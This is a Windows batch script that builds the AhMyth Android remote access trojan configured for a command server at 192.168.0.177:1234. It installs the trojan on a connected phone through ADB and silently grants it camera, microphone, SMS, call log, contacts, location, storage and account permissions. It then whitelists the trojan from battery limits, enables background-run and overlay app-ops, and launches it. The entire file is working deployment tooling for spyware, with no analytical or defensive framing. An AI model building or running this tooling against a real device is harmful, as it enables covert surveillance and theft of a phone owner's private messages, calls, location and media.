@echo off
REM AhMyth Build, Install, Grant Permissions and Run Script
REM Builds APK for IP 192.168.0.177:1234, signs, installs, grants all permissions, and runs

echo.
echo ========================================================
echo     AhMyth APK Builder, Installer and Runner
echo ========================================================
echo.
echo Target: 192.168.0.177:1234
echo.

REM Set variables
set SERVER_IP=192.168.0.177
set SERVER_PORT=1234
set PACKAGE_NAME=ahmyth.mine.king.ahmyth

echo [1/6] Checking ADB connection...
adb devices > nul 2>&1
if errorlevel 1 (
    echo [ERROR] ADB not found or no device connected
    echo Please ensure:
    echo - Android device is connected via USB
    echo - USB debugging is enabled
    echo - ADB is installed and in PATH
    pause
    exit /b 1
)

REM Get the first available device
for /f "tokens=1" %%i in ('adb devices ^| findstr /C:"device" ^| findstr /v "devices"') do (
    set DEVICE_ID=%%i
    goto :device_found
)

echo [ERROR] No device connected to ADB
echo Please connect your Android device and enable USB debugging
pause
exit /b 1

:device_found
echo [OK] Using device: %DEVICE_ID%

echo.
echo [2/6] Building APK with server configuration...
cd app\Factory
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { .\quick-build.ps1 -IP %SERVER_IP% -Port %SERVER_PORT% }"
if errorlevel 1 (
    echo [ERROR] Build failed
    cd ..\..
    pause
    exit /b 1
)

REM Find the latest built APK
for /f "delims=" %%i in ('dir /b /o-d "Ahmyth-*-aligned-debugSigned.apk" 2^>nul') do (
    set APK_FILE=%%i
    goto :found_apk
)
echo [ERROR] Built APK not found
cd ..\..
pause
exit /b 1

:found_apk
echo [OK] Built APK: %APK_FILE%

echo.
echo [3/6] Uninstalling previous version...
adb -s %DEVICE_ID% uninstall %PACKAGE_NAME% > nul 2>&1
echo [OK] Previous version removed

echo.
echo [4/6] Installing APK...
adb -s %DEVICE_ID% install -r -g "%APK_FILE%"
if errorlevel 1 (
    echo [ERROR] Installation failed
    cd ..\..
    pause
    exit /b 1
)
echo [OK] APK installed successfully

echo.
echo [5/6] Granting ALL permissions...

REM Runtime permissions
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.CAMERA > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.RECORD_AUDIO > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.READ_CONTACTS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.WRITE_CONTACTS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.READ_SMS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.SEND_SMS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.RECEIVE_SMS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.READ_CALL_LOG > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.READ_PHONE_STATE > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.CALL_PHONE > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.ACCESS_FINE_LOCATION > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.ACCESS_COARSE_LOCATION > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.ACCESS_BACKGROUND_LOCATION > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.READ_EXTERNAL_STORAGE > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.WRITE_EXTERNAL_STORAGE > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.POST_NOTIFICATIONS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.GET_ACCOUNTS > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.ACCESS_WIFI_STATE > nul 2>&1
adb -s %DEVICE_ID% shell pm grant %PACKAGE_NAME% android.permission.CHANGE_WIFI_STATE > nul 2>&1

REM Special permissions via appops
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% SYSTEM_ALERT_WINDOW allow > nul 2>&1
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% GET_USAGE_STATS allow > nul 2>&1
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% WRITE_SETTINGS allow > nul 2>&1
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% MANAGE_EXTERNAL_STORAGE allow > nul 2>&1
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow > nul 2>&1
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% RUN_IN_BACKGROUND allow > nul 2>&1
adb -s %DEVICE_ID% shell appops set %PACKAGE_NAME% RUN_ANY_IN_BACKGROUND allow > nul 2>&1

REM Battery optimization whitelist
adb -s %DEVICE_ID% shell cmd deviceidle whitelist +%PACKAGE_NAME% > nul 2>&1

echo [OK] All permissions granted

echo.
echo [6/6] Launching app...
adb -s %DEVICE_ID% shell am start -n %PACKAGE_NAME%/%PACKAGE_NAME%.MainActivity > nul 2>&1

REM Wait a moment and check if app is running
timeout /t 2 /nobreak > nul
adb -s %DEVICE_ID% shell pidof %PACKAGE_NAME% > nul 2>&1
if errorlevel 1 (
    echo [WARNING] Could not verify app is running
) else (
    echo [OK] App is running
)

cd ..

echo.
echo ========================================================
echo               SETUP COMPLETE!
echo ========================================================
echo.
echo Package: %PACKAGE_NAME%
echo Server:  %SERVER_IP%:%SERVER_PORT%
echo APK:     %APK_FILE%
echo.
echo The app should now be running on your device.
echo You can now start the server with: bun run server
echo.
echo Press any key to exit...
pause > nul
